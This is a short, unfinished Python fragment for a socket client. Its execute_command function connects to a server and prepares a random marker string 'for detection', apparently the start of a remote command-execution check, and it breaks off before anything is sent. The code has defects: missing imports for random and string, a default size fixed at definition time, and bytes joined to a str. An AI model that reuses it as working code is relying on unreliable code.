import socket
import re
 
# generate a random string between 2 and 10 characters long
def randomstring(size=random.randint(2, 10), chars=string.ascii_lowercase):
	return ''.join(random.choice(chars) for _ in range(size))
 
def receive(sock):
	data = sock.recv(4096)
	response = ''
	while data:
		response += data
		data = sock.recv(4096)
	return response

def send_and_receive(sock, message):
	sock.send(message)
	return receive(sock)
	
def execute_command(server_ip, server_port, command):
	# connect to the server
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((server_ip, server_port))
	client.settimeout(1)
	
	# generate a random string that we can use for detection
	random_data = randomstring()
	
	# send the random string
